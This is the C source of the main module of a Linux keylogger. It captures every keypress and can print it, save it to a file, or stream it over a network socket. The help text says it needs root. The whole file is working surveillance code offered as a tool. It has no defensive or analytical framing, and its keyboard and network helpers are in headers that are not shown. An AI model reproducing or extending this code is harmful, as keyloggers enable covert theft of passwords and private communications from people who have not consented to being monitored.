#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/limits.h>
#include "include/keyboard.h"
#include "include/network.h"

/*
usage:  keylogger --help
displays this help menu
keylogger [-f <output file>] [-n <port>][-v]
-f : for copything the output to a file
-n : for starting an http server to view the log
-v : enable verbose mode
Program will log all user keypresses. Caution, program most likely needs to be run as root.
The program can be configured to log to print to stdout, log to a file, and stream to socket.
 */


/* ---------------------------*/
// Variables
int g_verbose = 0;


/* ----------------------------------*/
// Private functions


void KLG_parseArgs( int argc, char **argv, char *outFilePath, size_t lenOutFilePath, int *outHttpPort );
void KLG_printHelp();
void KLG_output( char *str, int outFD, int networkFlag );

/*-----------------------------------*/

int main( int argc, char **argv ){
    
    char outputFile [PATH_MAX] = {0};
    int outputFD = -1;
    int networkFlag = 0;
    int port = -1;

    KLG_parseArgs( argc, argv, outputFile, sizeof outputFile, &port );       
    if( g_verbose ){
        printf( "outputfile : %s\nport : %d\nverbose : %d\n", outputFile, port, g_verbose );
    }
    
    if( strlen( outputFile )){
        outputFD = open( outputFile, O_RDWR | O_CREAT | O_TRUNC );
        if( outputFD == -1 ){
            perror( "ERROR opening output file" );
        }
        if( g_verbose ){
            printf( "opened output fd %d as %s\n", outputFD, outputFile );
        }
    }

    if( port > 0 ){
        KLG_networkInit( port );
        networkFlag = 1;
    }

    while ( 1 ){
        char *str = KLG_readKey();
        if( str != NULL ){
            KLG_output( str, outputFD, networkFlag );
        }
    }
}


void KLG_parseArgs( int argc, char *argv[], char *outFilePath, size_t lenOutFilePath, int *outHttpPort ){
    int i;
    for( i = 0; i < argc; i++ ){
        if( strcmp( argv[i], "--help" ) == 0){
            KLG_printHelp();
            exit(0);
        }else if( strcmp( argv[i], "-f" ) == 0 ){
            if( ++i < argc ){
                strncpy( outFilePath, argv[i], lenOutFilePath );
            }else{
                fprintf( stderr, "\nERROR: NO OUTPUT FILE SPECIFIED\n\n" );
                exit( 1 );
            }
        }else if( strcmp( argv[i], "-n" ) == 0 ){
            if( ++i < argc ){
                *outHttpPort = atoi( argv[i] );
            }else{
                fprintf( stderr, "\nERROR: NO HTTPPORT SPECIFIED\n\n" );
                exit( 1 );
            }
        }else if( strcmp( argv[i], "-v" ) == 0 ){
            g_verbose = 1;
        }else{
            if( i > 0 ){
                fprintf( stderr, "\nERROR: UNKNOWN INPUT FLAG %s\n\n", argv[i] );
            }
        }
    }
}

void KLG_printHelp(){
    const char *msg = "\
usage:  keylogger --help\n\
\tdisplays this help menu\n\
keylogger [-f <output file>] [-n <port>][-v]\n\
Program will log all user keypresses. Caution, program most likely needs to be run as root.\n\
The program can be configured to print to stdout, log to a file, and stream keypresses to socket.\n\
\t-f : for copything the output to a file\n\
\t-n : for starting a socket at port <port>\n\
\t-v : enable verbose mode\n";
    printf( "%s",msg );
}

void  KLG_output( char *str, int outFD, int networkFlag ){
    printf( "%s",str );
    if( outFD != -1 ){
        write( outFD, str, strlen( str ) * sizeof(char) );
        if( g_verbose )
            printf( "wrote %s to fd %d", str, outFD );
    }
    if( networkFlag ){
        KLG_transmit( str, strlen( str ) * sizeof(char) );
    }
    fflush( stdout );
}
